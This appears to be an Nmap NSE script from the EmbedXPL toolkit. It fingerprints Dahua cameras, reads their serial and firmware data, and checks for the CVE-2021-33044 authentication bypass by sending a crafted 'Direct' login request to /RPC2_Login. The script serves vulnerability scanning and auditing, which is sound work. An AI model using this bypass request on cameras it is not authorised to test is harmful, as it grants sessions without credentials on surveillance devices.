-- embedxpl-dahua-info.nse
-- EmbedXPL v5.0.0 — Custom NSE
-- Dahua camera information via HTTP API + CVE-2021-33044 auth bypass check.
-- Authors: André Henrique (@mrhenrike) | União Geek

local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local base64 = require "base64"

description = [[
EmbedXPL Dahua Camera Info.
Fingerprints Dahua cameras and checks for CVE-2021-33044 authentication bypass.
Extracts model, firmware version, serial number.
]]

categories = {"discovery", "vuln", "embedxpl"}
portrule = shortport.http

action = function(host, port)
    local results = {}

    -- CVE-2021-33044: Dahua auth bypass via special sessionLogin
    local bypass_body = '{"loginType":"Direct","userName":"admin","ipAddr":"","clientType":"Web3.0"}'
    local resp = http.post(host, port, "/RPC2_Login",
        {header={["Content-Type"]="application/json"}}, nil, bypass_body)

    if resp and resp.status == 200 and resp.body then
        if resp.body:find("sessionID") or resp.body:find("session") then
            results[#results+1] = "VULNERABLE: CVE-2021-33044 Dahua Authentication Bypass"
            results[#results+1] = "  Auth bypassed — session obtained without credentials"
        end
    end

    -- Try device info endpoint
    local info = http.get(host, port, "/cgi-bin/magicBox.cgi?action=getSystemInfo", {timeout=5000})
    if info and info.status == 200 and info.body then
        results[#results+1] = "Dahua Device Info:"
        for key, val in info.body:gmatch("([%w_]+)=([^\r\n]+)") do
            if key:find("serial") or key:find("softVersion") or key:find("deviceClass") then
                results[#results+1] = string.format("  %s: %s", key, val)
            end
        end
    else
        -- Fingerprint by login page
        local login = http.get(host, port, "/", {timeout=3000})
        if login and login.body and (login.body:find("[Dd]ahua") or login.body:find("RPC2")) then
            results[#results+1] = "Dahua web interface detected"
        else
            return nil
        end
    end

    return #results > 0 and table.concat(results, "\n") or nil
end
